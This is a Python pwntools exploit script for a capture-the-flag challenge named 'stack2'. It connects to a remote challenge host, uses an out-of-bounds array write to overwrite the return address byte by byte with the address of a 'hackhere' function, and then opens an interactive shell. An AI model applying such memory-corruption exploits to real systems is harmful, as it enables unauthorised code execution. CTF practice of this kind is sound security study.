from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('stack2')
io = remote('node4.buuoj.cn', 27014)
elf = ELF('stack2')
hackhere = elf.sym['hackhere']
canary = 0

io.sendlineafter('How many numbers you have:\n', '1')
for i in range(1):
    io.sendline('1')

for i in range(4):
    io.sendlineafter('5. exit\n', '3')
    io.sendlineafter('which number to change:\n', str(0x84 + i))
    io.sendlineafter('new number:\n', str((hackhere & (0xff << (i * 8))) >> (i * 8))) 

# gdb.attach(io)
# pause()
io.sendlineafter('5. exit\n', '5')
io.interactive()
